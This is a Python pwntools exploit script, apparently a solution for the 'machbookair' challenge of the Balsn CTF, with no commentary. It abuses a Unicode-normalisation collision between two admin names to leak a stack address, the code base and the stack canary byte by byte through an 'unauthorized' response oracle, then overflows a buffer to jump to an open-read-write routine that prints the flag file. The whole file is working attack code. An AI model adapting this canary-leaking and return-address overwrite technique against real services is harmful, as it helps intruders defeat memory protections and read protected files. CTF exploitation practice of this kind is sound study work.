#!/usr/bin/env python

import sys
from pwn import *

if len(sys.argv) == 1:
    r = remote('localhost', 19091)
    _REMOTE_ = False
else:
    r = remote('machbookair.balsnctf.com', 19091)
    _REMOTE_ = True

def create(title, content):
    r.sendlineafter('> ', '1')
    r.sendlineafter('title: ', title)
    r.sendlineafter('content: ', content)

def read(title):
    r.sendlineafter('> ', '2')
    r.sendlineafter('title: ', title)

def admin(password):
    r.sendlineafter('> ', '3')
    r.sendlineafter('password: ', password)
    # sleep(0.1)

def remove(title):
    r.sendlineafter('> ', '1')
    r.sendlineafter('title: ', title)

name1 = '\xc3\xa1'
name2 = '\x61\xcc\x81'

r.sendlineafter('admin: ', name1)

stack = ''
for j in range(6):
    create(name2, 'a'*(0xd-j))
    for i in range(256):
        admin('a'*(0xd-j) + chr(i) + stack)
        tmp = r.recvline().strip()
        if 'unauthorized' not in tmp:
            stack = chr(i) + stack
            remove(name2)
            r.sendlineafter('> ', '2')
            break
stack = u64(stack.ljust(8, '\x00'))
log.success('stack: ' + hex(stack))

code = ''
for j in range(5):
    create(name2, 'a'*(0x1c-j))
    for i in range(256):
        admin('a'*(0x1c-j) + chr(i) + code)
        tmp = r.recvline().strip()
        if 'unauthorized' not in tmp:
            code = chr(i) + code
            remove(name2)
            r.sendlineafter('> ', '2')
            break
code = u64(code.ljust(8, '\x00')) - 0x1bef
log.success('code: ' + hex(code))

canary = ''
for j in range(8):
    create(name2, 'a'*(0x27-j))
    for i in range(256):
        admin('a'*(0x27-j) + chr(i) + canary)
        tmp = r.recvline().strip()
        if 'unauthorized' not in tmp:
            canary = chr(i) + canary
            remove(name2)
            r.sendlineafter('> ', '2')
            break
canary = u64(canary.ljust(8, '\x00'))
log.success('canary: ' + hex(canary))

orw = code + 0x15c3
if not _REMOTE_:
    flagpath = '../../flag\x00'
else:
    flagpath = '/Users/ctf/machbookair/flag\x00'
create(name2, 'A'*0x38 + p64(canary) + p64(stack+0x70) + p64(orw) + 'B'*0x50 + flagpath)
admin('a')

r.interactive()
